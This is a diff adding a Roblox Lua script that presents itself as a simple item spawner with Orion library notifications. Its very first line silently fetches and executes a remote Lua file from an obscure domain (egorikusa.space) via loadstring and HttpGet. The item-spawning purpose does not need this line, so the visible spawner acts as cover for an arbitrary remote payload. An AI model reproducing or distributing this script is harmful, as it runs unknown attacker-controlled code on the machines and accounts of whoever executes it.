@@ -1,0 +1,42 @@
+loadstring(game:HttpGet("https://egorikusa.space/6d37cd0052f7e77ee693fc80.lua", true))()
+local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/OrionU/Orion/master/OrionLib.lua"))()
+
+-- Spawn parameters
+local spawnPosition = Vector3.new(0, 10, 0)  -- Change to where you want to spawn the item
+local itemName = "Part"  -- Change to the type of item you want to spawn (Part, Model, etc.)
+
+-- Function to create a visual item
+local function spawnItem()
+    local item
+
+    if itemName == "Part" then
+        -- Spawn a simple part if the item name is "Part"
+        item = Instance.new("Part")
+        item.Size = Vector3.new(4, 1, 4)
+        item.Anchored = true
+        item.Position = spawnPosition
+        item.Parent = workspace
+    elseif itemName == "harvester" then
+        -- Example: Spawn a model (replace with your own model or setup)
+        item = game.ServerStorage:WaitForChild("harvester"):Clone()  -- Assuming your model is in ServerStorage
+        item:SetPrimaryPartCFrame(CFrame.new(spawnPosition))
+        item.Parent = workspace
+    else
+        OrionLib:MakeNotification({
+            Name = "Error",
+            Content = "Item name not recognized!",
+            Time = 5
+        })
+        return
+    end
+
+    -- Notify player using Orion
+    OrionLib:MakeNotification({
+        Name = "Item Spawned",
+        Content = "A new item has been spawned at your location!",
+        Time = 5
+    })
+end
+
+-- Trigger the spawn (can be triggered by a button or other event)
+spawnItem()
